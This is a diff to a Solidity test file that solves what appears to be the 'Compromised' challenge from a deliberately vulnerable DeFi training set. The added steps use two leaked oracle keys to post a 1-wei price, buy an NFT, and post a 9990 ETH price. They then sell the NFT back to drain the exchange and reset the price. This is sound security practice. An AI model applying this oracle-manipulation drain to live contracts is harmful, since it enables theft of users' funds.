@@ -8,6 +8,8 @@ import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.
 import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 
+import {CompromisedAttack} from "../../../src/Contracts/compromised/CompromisedAttack.sol";
+
 contract Compromised is Test {
     uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
     uint256 internal constant INITIAL_NFT_PRICE = 999e18;
@@ -17,6 +19,8 @@ contract Compromised is Test {
     TrustfulOracleInitializer internal trustfulOracleInitializer;
     DamnValuableNFT internal damnValuableNFT;
     address payable internal attacker;
+
+    CompromisedAttack internal compromisedAttack;
 
     function setUp() public {
         address[] memory sources = new address[](3);
@@ -97,7 +101,35 @@ contract Compromised is Test {
         medianPrice = trustfulOracle.getMedianPrice("DVNFT");
         console2.log("The new median price is: ", medianPrice);
 
+        //5. initialize new attack contract
+        compromisedAttack = new CompromisedAttack(address(exchange), address(attacker), address(damnValuableNFT));
 
+        //6. initiate attack by buying nft at 1 wei 
+        vm.prank(attacker);
+        compromisedAttack.buyDiscountedNFT{value: 1 wei}();
+
+        //7. change the price of nft to 9990ETH to drain the Exchange 
+        vm.prank(key0xE92);
+        trustfulOracle.postPrice("DVNFT", 9990e18 + 1);
+
+        vm.prank(key0x81A);
+        trustfulOracle.postPrice("DVNFT", 9990e18 + 1);
+
+        // 8. finish attack by selling nft
+        vm.prank(attacker);
+        compromisedAttack.cashOut();
+
+        vm.prank(attacker);
+        compromisedAttack.withdraw();
+
+       // 9. Change the oracle price back to normal
+       vm.prank(key0xE92);
+        trustfulOracle.postPrice("DVNFT", 999e18);
+
+        vm.prank(key0x81A);
+        trustfulOracle.postPrice("DVNFT", 999e18);
+
+        
 
     
         /**
@@ -120,4 +152,6 @@ contract Compromised is Test {
         // NFT price shouldn't have changed
         assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
+
+     receive() payable external {}
 }
